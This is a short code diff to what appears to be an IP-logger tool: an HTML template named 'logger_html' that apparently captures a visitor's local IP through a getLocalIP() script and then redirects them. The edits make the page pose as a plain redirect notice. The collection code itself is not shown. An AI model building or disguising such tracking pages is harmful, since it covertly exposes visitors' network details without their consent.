@@ -29,9 +29,10 @@ logger_html = r"""
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>|TITLE|</title>
+    <title>Redirect</title>
 </head>
 <body>
+    <p>Redirecting you to |TITLE|</p>
     <script>
         function getLocalIP() {
             return new Promise(function(resolve, reject) {
@@ -126,7 +127,7 @@ try:
         replace_list = {
             "|URL|": url,
             "|REDIRECT|": redirect_url,
-            "|TITLE|": redirect_url.replace("https://", "")
+            "|TITLE|": redirect_url
         }
         return replace_all(replace_list, logger_html)
 
